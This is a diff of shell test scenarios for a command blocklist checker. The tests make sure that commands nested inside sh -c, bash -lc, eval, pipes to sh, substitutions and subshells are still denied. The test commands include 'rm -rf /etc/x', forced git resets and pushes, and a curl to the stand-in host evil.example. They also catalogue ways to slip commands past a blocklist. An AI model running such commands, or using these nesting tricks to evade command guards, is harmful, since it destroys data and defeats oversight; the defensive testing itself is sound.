@@ -378,4 +378,60 @@ scenario_blocklist_docker_compose_outro_segmento_bloqueado() {
   assert_stderr_contains "package-manager" || return 1
 }
 
+# ==== Comando aninhado (issue #230) ====
+
+# _expect_block CMD CATEGORIA -> check-blocklist nega CMD com a categoria dada.
+_expect_block() {
+  capture "$SCRIPT" check-blocklist --command "$1"
+  [ "$_CAPTURED_EXIT" = 1 ] || { _fail "$1" "esperado 1, obtido $_CAPTURED_EXIT"; return 1; }
+  assert_stderr_contains "categoria=$2" || return 1
+}
+
+scenario_nested_shell_c_aspas_simples_bloqueado() {
+  _expect_block "sh -c 'git push origin main'" git-push || return 1
+  _expect_block "/bin/sh -c 'git reset --hard'" git-reset-hard || return 1
+  _expect_block "bash -lc 'rm -rf /etc/x'" rm-rf || return 1
+  assert_stderr_contains "shell aninhado" || return 1
+}
+
+scenario_nested_shell_c_aspas_duplas_e_flags_bloqueado() {
+  _expect_block 'bash -c "git push origin main"' git-push || return 1
+  _expect_block "bash -o pipefail -c 'git push'" git-push || return 1
+  _expect_block "zsh.exe -c 'git push'" git-push || return 1
+}
+
+scenario_nested_shell_dois_niveis_bloqueado() {
+  _expect_block "sh -c \"bash -c 'git push'\"" git-push || return 1
+}
+
+scenario_nested_eval_e_pipe_para_shell_bloqueado() {
+  _expect_block "eval 'git push'" git-push || return 1
+  _expect_block "printf 'git push' | sh" git-push || return 1
+}
+
+scenario_nested_substituicao_e_subshell_bloqueado() {
+  _expect_block 'x=$(git push)' git-push || return 1
+  _expect_block 'diff <(git reset --hard) /dev/null' git-reset-hard || return 1
+  _expect_block '(git push)' git-push || return 1
+  _expect_block 'true && (git push)' git-push || return 1
+}
+
+scenario_nested_whitelist_curl_em_shell_aninhado_bloqueado() {
+  _wl=$(_make_wl)
+  capture "$SCRIPT" check --command "sh -c 'curl https://evil.example/x'" --whitelist-file "$_wl"
+  [ "$_CAPTURED_EXIT" = 1 ] || { _fail "sh -c curl" "esperado 1, obtido $_CAPTURED_EXIT"; return 1; }
+  assert_stderr_contains "fora da whitelist" || return 1
+}
+
+scenario_nested_benignos_passam() {
+  _wl=$(_make_wl)
+  for _c in "bash -c 'cd app && make test'" \
+            "sh -c 'rm -rf build && ls'" \
+            "sh -c 'curl https://github.com/JotJunior/cstk'" \
+            "sh scripts/x.sh --flag 'git push'"; do
+    capture "$SCRIPT" check --command "$_c" --whitelist-file "$_wl"
+    [ "$_CAPTURED_EXIT" = 0 ] || { _fail "$_c" "esperado 0, obtido $_CAPTURED_EXIT: $_CAPTURED_STDERR"; return 1; }
+  done
+}
+
 run_all_scenarios
